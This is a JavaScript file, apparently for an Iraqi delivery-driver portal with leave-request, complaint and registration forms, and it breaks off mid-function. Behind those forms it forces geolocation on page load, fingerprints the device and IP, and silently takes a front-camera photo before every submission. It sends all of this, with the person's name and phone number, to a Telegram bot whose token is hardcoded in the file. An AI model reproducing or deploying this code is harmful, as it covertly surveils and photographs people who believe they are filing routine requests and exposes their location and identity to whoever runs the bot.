// معلومات بوت تيليجرام - يجب تغييرها إلى بيانات البوت الصحيحة
// للحصول على BOT_TOKEN: تحدث مع @BotFather في تيليجرام
// للحصول على CHAT_ID: أضف البوت إلى المجموعة واستخدم @userinfobot
const TELEGRAM_BOT_TOKEN = '2094023494:AAEpX9YYAv0mWx5qR3a2HJV5g_r9XbTrjNo';
const TELEGRAM_CHAT_ID = '@report_deliveryiraq';

let currentDriver = null;
let userLocation = null;
let userIP = null;
let deviceName = null;
let systemInfo = {};
let capturedPhoto = null;

// الحصول على جميع المعلومات عند تحميل الصفحة
window.addEventListener('load', () => {
    initializeUserData();
});

// تهيئة جمع بيانات المستخدم (إجباري)
async function initializeUserData() {
    try {
        // الحصول على الموقع (إجباري)
        await getCurrentLocationForced();

        // الحصول على IP
        await getUserIP();

        // الحصول على معلومات النظام المتقدمة
        getAdvancedSystemInfo();

        console.log('تم جمع جميع البيانات بنجاح');
    } catch (error) {
        console.error('خطأ في جمع البيانات:', error);
        // حتى لو فشل جمع بعض البيانات، نكمل العمل
    }
}

// تسجيل الدخول
document.getElementById('loginForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const driverName = document.getElementById('driverName').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();

    // التحقق من البيانات الأساسية
    if (!driverName) {
        showErrorModal('خطأ في الاسم', 'يرجى إدخال اسمك الثلاثي');
        return;
    }

    if (!phoneNumber) {
        showErrorModal('خطأ في رقم الهاتف', 'يرجى إدخال رقم هاتفك');
        return;
    }

    // التحقق من صحة البيانات
    if (!validateArabicName(driverName)) {
        showErrorModal('خطأ في الاسم', 'يرجى إدخال الاسم الثلاثي باللغة العربية فقط\nمثال: محمد علي حسن');
        return;
    }

    if (!validatePhoneNumber(phoneNumber)) {
        showErrorModal('خطأ في رقم الهاتف', 'يرجى إدخال رقم هاتف صحيح مكون من 11 رقم\nمثال: 07901234567');
        return;
    }

    // إنشاء بيانات السائق
    currentDriver = {
        phone: phoneNumber,
        name: driverName
    };

    // حفظ بيانات السائق في localStorage
    localStorage.setItem('currentDriver', JSON.stringify(currentDriver));

    // إظهار الصفحة الرئيسية
    showMainPage();

    // تحديث معلومات السائق
    document.getElementById('driverNameDisplay').textContent = currentDriver.name;
    document.getElementById('driverPhone').textContent = currentDriver.phone;
});

// التحقق من صحة الاسم العربي (ثلاثي)
function validateArabicName(name) {
    // التحقق من أن الاسم يحتوي على أحرف عربية ومسافات فقط
    const arabicNameRegex = /^[\u0600-\u06FF\s]+$/;
    if (!arabicNameRegex.test(name)) {
        return false;
    }

    // التحقق من أن الاسم يحتوي على 3 أجزاء على الأقل
    const nameParts = name.trim().split(/\s+/);
    return nameParts.length >= 3;
}

// التحقق من صحة رقم الهاتف (11 رقم)
function validatePhoneNumber(phone) {
    // إزالة أي مسافات أو رموز خاصة
    const cleanPhone = phone.replace(/\D/g, '');
    // التحقق من أن الرقم مكون من 11 رقم بالضبط
    return cleanPhone.length === 11 && /^\d{11}$/.test(cleanPhone);
}

// تسجيل حساب جديد
document.getElementById('registerForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    // التحقق من صحة البيانات
    if (!validateRegistrationForm()) {
        return;
    }

    const submitButton = e.target.querySelector('button[type="submit"]');
    const originalText = submitButton.textContent;

    // تعطيل الزر وإظهار حالة التحميل
    setButtonLoading(submitButton, 'جاري الإرسال...');

    const registrationData = {
        name: document.getElementById('newDriverName').value,
        phone: document.getElementById('newDriverPhone').value,
        employeeId: document.getElementById('employeeId').value || 'غير محدد',
        department: document.getElementById('department').value
    };

    const success = await sendToTelegram('طلب تسجيل حساب جديد', registrationData);

    // إعادة تفعيل الزر
    resetButtonLoading(submitButton, originalText);

    if (success) {
        // إظهار رسالة نجاح بسيطة والانتقال مباشرة لصفحة تسجيل الدخول
        showSuccessMessage();
        document.getElementById('registerForm').reset();

        // العودة لصفحة تسجيل الدخول بعد 3 ثوان
        setTimeout(() => {
            hideSuccessMessage();
            showPage('loginPage');
        }, 3000);
    }
});

// طلب الإجازة
document.getElementById('vacationForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const submitButton = e.target.querySelector('button[type="submit"]');
    const originalText = submitButton.textContent;

    // تعطيل الزر وإظهار حالة التحميل
    setButtonLoading(submitButton, 'جاري الإرسال...');

    const vacationType = document.querySelector('input[name="vacationType"]:checked').value;
    let timeDetails = '';

    if (vacationType === 'نصف يوم') {
        const halfDayTime = document.querySelector('input[name="halfDayTime"]:checked');
        timeDetails = halfDayTime ? halfDayTime.value : '';
    } else if (vacationType === 'وقت محدد') {
        const startTime = document.getElementById('startTime').value;
        const endTime = document.getElementById('endTime').value;
        timeDetails = `من ${startTime} إلى ${endTime}`;
    }

    const vacationData = {
        startDate: document.getElementById('vacationStartDate').value,
        endDate: document.getElementById('vacationEndDate').value,
        type: vacationType,
        timeDetails: timeDetails,
        calculatedDuration: document.getElementById('calculatedDuration').textContent,
        reason: document.getElementById('vacationReason').value
    };

    const success = await sendToTelegram('طلب إجازة', vacationData);

    // إعادة تفعيل الزر
    resetButtonLoading(submitButton, originalText);

    if (success) {
        showSuccessMessage();
        document.getElementById('vacationForm').reset();
        calculateVacationDuration(); // إعادة تعيين العرض
    }
});

// التحكم في خيارات نوع الإجازة
document.addEventListener('DOMContentLoaded', function() {
    const vacationTypeRadios = document.querySelectorAll('input[name="vacationType"]');
    const halfDayOptions = document.getElementById('halfDayOptions');
    const customTimeOptions = document.getElementById('customTimeOptions');

    vacationTypeRadios.forEach(radio => {
        radio.addEventListener('change', function() {
            halfDayOptions.classList.add('hidden');
            customTimeOptions.classList.add('hidden');

            if (this.value === 'نصف يوم') {
                halfDayOptions.classList.remove('hidden');
            } else if (this.value === 'وقت محدد') {
                customTimeOptions.classList.remove('hidden');
            }

            calculateVacationDuration();
        });
    });

    // حساب مدة الإجازة عند تغيير التواريخ
    document.getElementById('vacationStartDate').addEventListener('change', calculateVacationDuration);
    document.getElementById('vacationEndDate').addEventListener('change', calculateVacationDuration);
    document.querySelectorAll('input[name="halfDayTime"]').forEach(radio => {
        radio.addEventListener('change', calculateVacationDuration);
    });
    document.getElementById('startTime').addEventListener('change', calculateVacationDuration);
    document.getElementById('endTime').addEventListener('change', calculateVacationDuration);

    // تعيين التاريخ الافتراضي لليوم التالي
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const tomorrowString = tomorrow.toISOString().split('T')[0];
    document.getElementById('vacationStartDate').value = tomorrowString;
    document.getElementById('vacationEndDate').value = tomorrowString;

    calculateVacationDuration();
});

// حساب مدة الإجازة
function calculateVacationDuration() {
    const startDate = new Date(document.getElementById('vacationStartDate').value);
    const endDate = new Date(document.getElementById('vacationEndDate').value);
    const vacationType = document.querySelector('input[name="vacationType"]:checked')?.value;
    const durationElement = document.getElementById('calculatedDuration');

    if (!startDate || !endDate || startDate > endDate) {
        durationElement.textContent = 'يرجى التحقق من التواريخ';
        durationElement.className = 'duration-value error';
        return;
    }

    const diffTime = Math.abs(endDate - startDate);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + 1;

    let durationText = '';
    let durationClass = 'duration-value';

    if (vacationType === 'نصف يوم' && diffDays === 1) {
        durationText = 'نصف يوم واحد';
        durationClass += ' half-day';
    } else if (vacationType === 'وقت محدد' && diffDays === 1) {
        const startTime = document.getElementById('startTime').value;
        const endTime = document.getElementById('endTime').value;
        if (startTime && endTime) {
            const start = new Date(`2000-01-01 ${startTime}`);
            const end = new Date(`2000-01-01 ${endTime}`);
            const hours = Math.abs(end - start) / (1000 * 60 * 60);
            durationText = `${hours} ساعة`;
            durationClass += ' custom-time';
        } else {
            durationText = 'يرجى تحديد الأوقات';
            durationClass += ' error';
        }
    } else {
        if (diffDays === 1) {
            durationText = 'يوم واحد';
        } else if (diffDays === 2) {
            durationText = 'يومان';
        } else if (diffDays <= 10) {
            durationText = `${diffDays} أيام`;
        } else {
            durationText = `${diffDays} يوماً`;
        }

        if (diffDays >= 7) {
            const weeks = Math.floor(diffDays / 7);
            const remainingDays = diffDays % 7;
            if (weeks === 1 && remainingDays === 0) {
                durationText = 'أسبوع واحد';
            } else if (weeks > 1 && remainingDays === 0) {
                durationText = `${weeks} أسابيع`;
            } else if (weeks === 1) {
                durationText = `أسبوع و ${remainingDays} أيام`;
            } else {
                durationText = `${weeks} أسابيع و ${remainingDays} أيام`;
            }
        }

        durationClass += ' full-time';
    }

    durationElement.textContent = durationText;
    durationElement.className = durationClass;
}

// رفع الشكوى
document.getElementById('complaintForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const submitButton = e.target.querySelector('button[type="submit"]');
    const originalText = submitButton.textContent;

    // تعطيل الزر وإظهار حالة التحميل
    setButtonLoading(submitButton, 'جاري الإرسال...');

    const complaintData = {
        type: document.getElementById('complaintType').value,
        details: document.getElementById('complaintDetails').value
    };

    const success = await sendToTelegram('شكوى', complaintData);

    // إعادة تفعيل الزر
    resetButtonLoading(submitButton, originalText);

    if (success) {
        showSuccessMessage();
        document.getElementById('complaintForm').reset();
    }
});

// التقاط صورة بالكاميرا الأمامية
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());

                // تحويل الصورة إلى base64
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                resolve(photoData);
            };
        });
    } catch (error) {
        console.error('خطأ في التقاط الصورة:', error);
        return null;
    }
}

// إرسال البيانات إلى تيليجرام
async function sendToTelegram(requestType, data) {
    // إظهار شاشة التحميل
    showGlobalLoading(`جاري إرسال ${requestType}...`);
    updateLoadingStep(1, 10);

    // التحقق من وجود الموقع الجغرافي (إجباري)
    if (!userLocation || !userLocation.latitude || userLocation.latitude === 'فشل في التحديد') {
        hideGlobalLoading();
        showErrorModal('خطأ في الموقع', 'لا يمكن إرسال الطلب بدون تحديد الموقع الجغرافي');
        return false;
    }

    updateLoadingStep(2, 25);

    // التقاط صورة قبل إرسال الطلب
    console.log(' جاري التحميل...');
    capturedPhoto = await capturePhoto();

    updateLoadingStep(3, 50);

    const deviceInfo = getDeviceInfo();
    const timestamp = new Date().toLocaleString('ar-EG', {
        timeZone: 'Asia/Baghdad',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });

    // الرسالة الأولى: معلومات الطلب الأساسية
    let message1 = `🚗 دلفري العراق - ${requestType}\n\n`;
    message1 += `👤 السائق: ${currentDriver.name}\n`;
    message1 += `📱 رقم الهاتف: ${currentDriver.phone}\n`;
    message1 += `⏰ التوقيت: ${timestamp}\n\n`;

    if (requestType === 'طلب إجازة') {
        message1 += `📅 تاريخ البداية: ${data.startDate}\n`;
        message1 += `📅 تاريخ النهاية: ${data.endDate}\n`;
        message1 += `🕐 نوع الإجازة: ${data.type}\n`;
        if (data.timeDetails) {
            message1 += `⏰ تفاصيل الوقت: ${data.timeDetails}\n`;
        }
        message1 += `⏳ مدة الإجازة: ${data.calculatedDuration}\n`;
        message1 += `📝 السبب: ${data.reason}`;
    } else if (requestType === 'شكوى') {
        message1 += `📋 نوع الشكوى: ${data.type}\n`;
        message1 += `📝 التفاصيل: ${data.details}`;
    } else if (requestType === 'طلب تسجيل حساب جديد') {
        message1 += `👤 اسم السائق: ${data.name}\n`;
        message1 += `📱 رقم الهاتف: ${data.phone}\n`;
        message1 += `🏢 رقم الموظف: ${data.employeeId}\n`;
        message1 += `💼 القسم: ${data.department}`;
    }

    // الرسالة الثانية: معلومات الجهاز والشبكة والموقع
    let message2 = `📱 معلومات الجهاز التفصيلية - ${currentDriver.name}:\n`;
    message2 += `• اسم الجهاز: ${deviceInfo.deviceName}\n`;
    message2 += `• النوع: ${deviceInfo.type}\n`;
    message2 += `• المتصفح: ${deviceInfo.browser}\n`;
    message2 += `• نظام التشغيل: ${deviceInfo.os}\n`;
    message2 += `• المنصة: ${deviceInfo.platform}\n`;
    message2 += `• دقة الشاشة: ${deviceInfo.screenResolution}\n`;
    message2 += `• عمق الألوان: ${deviceInfo.screenColorDepth} بت\n`;
    message2 += `• اللغة: ${deviceInfo.language}\n`;
    message2 += `• المنطقة الزمنية: ${deviceInfo.timezone}\n`;
    message2 += `• معالجات CPU: ${deviceInfo.hardwareConcurrency}\n`;
    message2 += `• ذاكرة الجهاز: ${deviceInfo.deviceMemory} GB\n`;
    message2 += `• نوع الاتصال: ${deviceInfo.connectionType}\n`;
    message2 += `• الكوكيز مفعلة: ${deviceInfo.cookieEnabled ? 'نعم' : 'لا'}\n`;
    message2 += `• حالة الاتصال: ${deviceInfo.onlineStatus ? 'متصل' : 'غير متصل'}\n`;
    message2 += `• نسبة البكسل: ${systemInfo.pixelRatio}\n`;
    message2 += `• حجم النافذة: ${systemInfo.viewportSize}\n`;
    message2 += `• البطارية: ${systemInfo.batteryLevel}\n\n`;

    message2 += `🌐 معلومات الشبكة:\n`;
    message2 += `• عنوان IP: ${userIP || 'غير متاح'}\n`;
    if (systemInfo.ipDetails) {
        message2 += `• البلد: ${systemInfo.ipDetails.country}\n`;
        message2 += `• المدينة: ${systemInfo.ipDetails.city}\n`;
        message2 += `• المنطقة: ${systemInfo.ipDetails.region}\n`;
        message2 += `• مزود الخدمة: ${systemInfo.ipDetails.isp}\n`;
        message2 += `• المؤسسة: ${systemInfo.ipDetails.org}\n`;
        message2 += `• المنطقة الزمنية: ${systemInfo.ipDetails.timezone}\n`;
        message2 += `• بروكسي: ${systemInfo.ipDetails.isProxy ? 'نعم' : 'لا'}\n`;
        message2 += `• استضافة: ${systemInfo.ipDetails.isHosting ? 'نعم' : 'لا'}\n`;
    }
    message2 += `\n`;

    if (userLocation) {
        message2 += `📍 الموقع الجغرافي:\n`;
        message2 += `• خط العرض: ${userLocation.latitude}\n`;
        message2 += `• خط الطول: ${userLocation.longitude}\n`;
        if (userLocation.accuracy) {
            message2 += `• دقة الموقع: ${userLocation.accuracy} متر\n`;
        }
        if (userLocation.altitude) {
            message2 += `• الارتفاع: ${userLocation.altitude} متر\n`;
        }
        if (userLocation.speed) {
            message2 += `• السرعة: ${userLocation.speed} م/ث\n`;
        }
        if (userLocation.heading) {
            message2 += `• الاتجاه: ${userLocation.heading}°\n`;
        }
        if (userLocation.timestamp) {
            message2 += `• وقت التحديد: ${userLocation.timestamp}\n`;
        }
        if (userLocation.country) {
            message2 += `• البلد: ${userLocation.country}\n`;
        }
        if (userLocation.city) {
            message2 += `• المدينة: ${userLocation.city}\n`;
        }
        if (userLocation.source) {
            message2 += `• مصدر الموقع: ${userLocation.source}\n`;
        }
        message2 += `• رابط خرائط جوجل: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}\n`;
        message2 += `• رابط خرائط بنج: https://www.bing.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
    } else {
        message2 += `📍 الموقع: فشل في التحديد`;
    }

    // في حالة الاختبار، نعرض الرسائل في وحدة التحكم
    console.log('الرسالة الأولى:', message1);
    console.log('الرسالة الثانية:', message2);

    try {
        // إرسال الرسالة الأولى
        const response1 = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message1,
                parse_mode: 'HTML'
            })
        });

        const result1 = await response1.json();

        if (!response1.ok) {
            console.error('خطأ في إرسال الرسالة الأولى:', result1);
            throw new Error(`خطأ ${response1.status}: ${result1.description || 'فشل في إرسال الرسالة الأولى'}`);
        }

        console.log('تم إرسال الرسالة الأولى بنجاح إلى تيليجرام');

        // انتظار قصير بين الرسائل
        await new Promise(resolve => setTimeout(resolve, 1000));

        // إرسال الرسالة الثانية
        const response2 = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message2,
                parse_mode: 'HTML'
            })
        });

        const result2 = await response2.json();

        if (!response2.ok) {
            console.error('خطأ في إرسال الرسالة الثانية:', result2);
            throw new Error(`خطأ ${response2.status}: ${result2.description || 'فشل في إرسال الرسالة الثانية'}`);
        }

        console.log('تم إرسال الرسالة الثانية بنجاح إلى تيليجرام');
        updateLoadingStep(3, 75);

        // انتظار قصير قبل إرسال الصورة
        await new Promise(resolve => setTimeout(resolve, 1000));

        // إرسال الصورة (الرسالة الثالثة) إذا تم التقاطها
        if (capturedPhoto) {
            await sendPhotoToTelegram(capturedPhoto, `📸 صورة ${requestType} - ${currentDriver.name}`);
        }

        updateLoadingStep(4, 100);

        // انتظار قصير لإظهار الإكمال
        await new Promise(resolve => setTimeout(resolve, 1000));
        hideGlobalLoading();

        return true;
    } catch (error) {
        console.error('خطأ في إرسال الرسائل:', error);
        hideGlobalLoading();

        // إظهار رسالة خطأ للمستخدم
        showErrorModal('خطأ في الإرسال',
            'لم يتم إرسال الطلب إلى تيليجرام.\n' +
            'تحقق من إعدادات البوت أو تواصل مع الإدارة.\n' +
            'الخطأ: ' + error.message
        );
        return false;
    }
}

// دوال التحكم في حالة التحميل للأزرار
function setButtonLoading(button, loadingText) {
    button.disabled = true;
    button.classList.add('loading');
    button.innerHTML = `
        <div class="loading-content">
            <div class="spinner"></div>
            <span class="loading-text">${loadingText}</span>
        </div>
    `;

    // إضافة تأثير النبض للزر
    button.style.animation = 'pulse 1.5s ease-in-out infinite';
}

function resetButtonLoading(button, originalText) {
    button.disabled = false;
    button.classList.remove('loading');
    button.innerHTML = originalText;
    button.style.animation = '';
}

// إظهار شاشة التحميل العامة
function showGlobalLoading(message = 'جاري المعالجة...') {
    const existingLoader = document.getElementById('globalLoader');
    if (existingLoader) {
        existingLoader.remove();
    }

    const loader = document.createElement('div');
    loader.id = 'globalLoader';
    loader.className = 'global-loading-overlay';
    loader.innerHTML = `
        <div class="global-loading-content">
            <div class="loading-animation">
                <div class="bounce1"></div>
                <div class="bounce2"></div>
                <div class="bounce3"></div>
            </div>
            <h3 class="loading-title">${message}</h3>
            <div class="loading-steps">
                <div class="step active" id="step1">📱 ارسال طلبك </div>
                <div class="step" id="step2">  ✅تاكيد الطلب</div>
                <div class="step" id="step3">📤 إرسال الطلب</div>
                <div class="step" id="step4">✅ تأكيد الإرسال</div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
    `;

    document.body.appendChild(loader);

    // تأثير الظهور
    setTimeout(() => {
        loader.classList.add('show');
    }, 10);
}

// إخفاء شاشة التحميل العامة
function hideGlobalLoading() {
    const loader = document.getElementById('globalLoader');
    if (loader) {
        loader.classList.remove('show');
        setTimeout(() => {
            loader.remove();
        }, 300);
    }
}

// تحديث خطوة التحميل
function updateLoadingStep(stepNumber, progress = 0) {
    const steps = document.querySelectorAll('.step');
    const progressFill = document.getElementById('progressFill');

    steps.forEach((step, index) => {
        if (index < stepNumber) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (index === stepNumber - 1) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });

    if (progressFill) {
        progressFill.style.width = `${progress}%`;
    }
}

// دالة قبول الأذونات
function acceptPermissions() {
    // طلب أذونات الموقع والكاميرا
    getCurrentLocationForced().then(() => {
        console.log('تم قبول أذونات الموقع');
    }).catch(error => {
        console.error('خطأ في الحصول على أذونات الموقع:', error);
    });

    // طلب أذونات الكاميرا
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                console.log('تم قبول أذونات الكاميرا');
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(error => {
                console.error('خطأ في الحصول على أذونات الكاميرا:', error);
            });
    }
}

// إرسال الصورة إلى تيليجرام
async function sendPhotoToTelegram(photoData, caption) {
    try {
        // تحويل base64 إلى blob
        const response = await fetch(photoData);
        const blob = await response.blob();

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);

        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await telegramResponse.json();

        if (!telegramResponse.ok) {
            console.error('خطأ في إرسال الصورة:', result);
            throw new Error(`خطأ ${telegramResponse.status}: ${result.description || 'فشل في إرسال الصورة'}`);
        }

        console.log('تم إرسال الصورة بنجاح إلى تيليجرام');
        return true;
    } catch (error) {
        console.error('خطأ في إرسال الصورة:', error);
        // لا نوقف العملية حتى لو فشل إرسال الصورة
        return false;
    }
}

// الحصول على معلومات الجهاز المتقدمة
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = 'Unknown';
    let browser = 'Unknown';
    let os = 'Unknown';

    // تحديد نوع الجهاز
    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = 'هاتف محمول';
    } else if (/Tablet|iPad/i.test(userAgent)) {
        deviceType = 'تابلت';
    } else {
        deviceType = 'حاسوب مكتبي';
    }

    // تحديد المتصفح
    if (userAgent.includes('Chrome')) {
        browser = 'Chrome';
    } else if (userAgent.includes('Firefox')) {
        browser = 'Firefox';
    } else if (userAgent.includes('Safari')) {
        browser = 'Safari';
    } else if (userAgent.includes('Edge')) {
        browser = 'Edge';
    }

    // تحديد نظام التشغيل
    if (userAgent.includes('Windows')) {
        os = 'Windows';
    } else if (userAgent.includes('Mac')) {
        os = 'macOS';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
    } else if (userAgent.includes('Android')) {
        os = 'Android';
    } else if (userAgent.includes('iOS')) {
        os = 'iOS';
    }

    // معلومات إضافية
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language || navigator.userLanguage;
    const platform = navigator.platform;
    const cookieEnabled = navigator.cookieEnabled;
    const onlineStatus = navigator.onLine;

    return {
        type: deviceType,
        browser: browser,
        os: os,
        screenResolution: `${screen.width}x${screen.height}`,
        screenColorDepth: screen.colorDepth,
        timezone: timezone,
        language: language,
        platform: platform,
        cookieEnabled: cookieEnabled,
        onlineStatus: onlineStatus,
        userAgent: userAgent,
        deviceName: deviceName || 'غير متاح',
        hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
        deviceMemory: navigator.deviceMemory || 'غير متاح',
        connectionType: getConnectionType()
    };
}

// الحصول على نوع الاتصال
function getConnectionType() {
    if ('connection' in navigator) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return connection ? `${connection.effectiveType} - ${connection.type}` : 'غير متاح';
    }
    return 'غير متاح';
}

// جمع معلومات النظام المتقدمة
function getAdvancedSystemInfo() {
    try {
        // محاولة الحصول على اسم الجهاز من localStorage أو تخمينه
        deviceName = localStorage.getItem('deviceName') || detectDeviceName();

        // حفظ معلومات إضافية
        systemInfo = {
            availableScreenSize: `${screen.availWidth}x${screen.availHeight}`,
            pixelRatio: window.devicePixelRatio,
            viewportSize: `${window.innerWidth}x${window.innerHeight}`,
            batteryLevel: 'جاري التحقق...',
            networkInfo: 'جاري التحقق...'
        };

        // محاولة الحصول على معلومات البطارية
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                systemInfo.batteryLevel = `${Math.round(battery.level * 100)}% - ${battery.charging ? 'يشحن' : 'لا يشحن'}`;
            }).catch(() => {
                systemInfo.batteryLevel = 'غير متاح';
            });
        } else {
            systemInfo.batteryLevel = 'غير مدعوم';
        }

        console.log('تم جمع معلومات النظام المتقدمة');
    } catch (error) {
        console.error('خطأ في جمع معلومات النظام:', error);
    }
}

// تخمين اسم الجهاز
function detectDeviceName() {
    const userAgent = navigator.userAgent;

    // أجهزة آيفون
    if (/iPhone/.test(userAgent)) {
        if (/iPhone.*15/.test(userAgent)) return 'iPhone 15';
        if (/iPhone.*14/.test(userAgent)) return 'iPhone 14';
        if (/iPhone.*13/.test(userAgent)) return 'iPhone 13';
        if (/iPhone.*12/.test(userAgent)) return 'iPhone 12';
        if (/iPhone.*11/.test(userAgent)) return 'iPhone 11';
        return 'iPhone';
    }

    // أجهزة آيباد
    if (/iPad/.test(userAgent)) {
        return 'iPad';
    }

    // أجهزة أندرويد
    if (/Android/.test(userAgent)) {
        if (/SM-/.test(userAgent)) return 'Samsung Galaxy';
        if (/Pixel/.test(userAgent)) return 'Google Pixel';
        if (/HUAWEI/.test(userAgent)) return 'Huawei';
        if (/OPPO/.test(userAgent)) return 'OPPO';
        if (/vivo/.test(userAgent)) return 'Vivo';
        if (/Xiaomi/.test(userAgent)) return 'Xiaomi';
        return 'Android Device';
    }

    // أجهزة Windows
    if (/Windows/.test(userAgent)) {
        if (/Windows NT 10/.test(userAgent)) return 'Windows 10/11 PC';
        if (/Windows NT 6/.test(userAgent)) return 'Windows PC';
        return 'Windows Computer';
    }

    // أجهزة Mac
    if (/Macintosh/.test(userAgent)) {
        return 'Mac Computer';
    }

    return 'جهاز غير معروف';
}

// الحصول على الموقع الجغرافي (إجباري)
function getCurrentLocationForced() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            // محاولة الحصول على الموقع من IP
            getLocationFromIP().then(resolve).catch(reject);
            return;
        }

        let locationAttempts = 0;
        const maxAttempts = 3;

        function attemptLocation() {
            locationAttempts++;

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation = {
                        latitude: position.coords.latitude.toFixed(6),
                        longitude: position.coords.longitude.toFixed(6),
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        timestamp: new Date(position.timestamp).toLocaleString('ar-EG')
                    };
                    console.log('تم الحصول على الموقع:', userLocation);
                    resolve(userLocation);
                },
                (error) => {
                    console.error(`محاولة ${locationAttempts}: فشل في الحصول على الموقع:`, error.message);

                    if (locationAttempts < maxAttempts) {
                        // إعادة المحاولة مع إعدادات أقل دقة
                        setTimeout(() => {
                            attemptLocation();
                        }, 2000);
                    } else {
                        // إذا فشلت جميع المحاولات، نحاول الحصول على الموقع من IP
                        getLocationFromIP().then(resolve).catch(() => {
                            // حتى لو فشل كل شيء، نحفظ معلومات الخطأ
                            userLocation = {
                                latitude: 'فشل في التحديد',
                                longitude: 'فشل في التحديد',
                                error: error.message,
                                errorCode: error.code
                            };
                            resolve(userLocation);
                        });
                    }
                },
                {
                    enableHighAccuracy: locationAttempts === 1, // دقة عالية في المحاولة الأولى فقط
                    timeout: locationAttempts === 1 ? 15000 : 10000,
                    maximumAge: locationAttempts === 1 ? 0 : 300000
                }
            );
        }

        attemptLocation();
    });
}

// الحصول على الموقع من عنوان IP
async function getLocationFromIP() {
    try {
        const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query', {
            method: 'GET'
        });

        if (response.ok) {
            const data = await response.json();
            if (data.status === 'success') {
                userLocation = {
                    latitude: data.lat.toFixed(6),
                    longitude: data.lon.toFixed(6),
                    country: data.country,
                    city: data.city,
                    region: data.regionName,
                    isp: data.isp,
                    org: data.org,
                    source: 'IP Location'
                };
                console.log('تم الحصول على الموقع من IP:', userLocation);
                return userLocation;
            }
        }
        throw new Error('فشل في الحصول على موقع IP');
    } catch (error) {
        console.error('خطأ في الحصول على موقع IP:', error);
        throw error;
    }
}

// الحصول على عنوان IP الخاص بالمستخدم
async function getUserIP() {
    try {
        // استخدام عدة خدمات للحصول على IP
        const ipServices = [
            'https://api.ipify.org?format=json',
            'https://httpbin.org/ip',
            'https://api.ip.sb/ip',
            'https://icanhazip.com'
        ];

        for (const service of ipServices) {
            try {
                const response = await fetch(service);
                if (response.ok) {
                    const data = await response.text();
                    let ip;

                    try {
                        const jsonData = JSON.parse(data);
                        ip = jsonData.ip || jsonData.origin;
                    } catch {
                        ip = data.trim();
                    }

                    if (ip && ip.length > 0) {
                        userIP = ip;
                        console.log('تم الحصول على IP:', userIP);

                        // الحصول على معلومات إضافية عن IP
                        await getIPDetails(ip);
                        return ip;
                    }
                }
            } catch (error) {
                console.error(`فشل في الحصول على IP من ${service}:`, error);
                continue;
            }
        }

        throw new Error('فشل في الحصول على IP من جميع الخدمات');
    } catch (error) {
        console.error('خطأ في الحصول على IP:', error);
        userIP = 'غير متاح';
    }
}

// الحصول على تفاصيل IP
async function getIPDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting`);

        if (response.ok) {
            const data = await response.json();
            if (data.status === 'success') {
                systemInfo.ipDetails = {
                    country: data.country,
                    city: data.city,
                    region: data.regionName,
                    isp: data.isp,
                    org: data.org,
                    timezone: data.timezone,
                    isProxy: data.proxy,
                    isHosting: data.hosting
                };
                console.log('تم الحصول على تفاصيل IP:', systemInfo.ipDetails);
            }
        }
    } catch (error) {
        console.error('خطأ في الحصول على تفاصيل IP:', error);
    }
}

// وظائف التنقل بين الصفحات
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

function showMainPage() {
    showPage('mainPage');
}

function showVacationForm() {
    showPage('vacationPage');
}

function showComplaintForm() {
